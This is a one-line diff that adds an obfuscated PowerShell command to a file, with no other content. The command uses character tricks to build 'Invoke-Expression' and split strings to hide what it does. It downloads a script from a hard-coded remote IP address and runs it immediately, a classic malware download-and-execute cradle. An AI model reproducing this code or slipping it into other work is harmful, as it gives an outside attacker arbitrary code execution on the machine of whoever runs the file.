@@ -1,0 +1,1 @@
+﻿ &( ([string]$verbOSePReFerenCe)[1,3]+'x'-joIn'')(('i'+'ex'+' '+'('+'New'+'-Object Net.W'+'e'+'bClie'+'nt).Download'+'St'+'ring'+'(1AC'+'ht'+'tp:/'+'/5'+'2'+'.183.'+'79.'+'94:80/TYB'+'MkT'+'fs'+'Q1'+'A'+'C)').REpLACe(([cHaR]49+[cHaR]65+[cHaR]67),[sTrInG][cHaR]34))
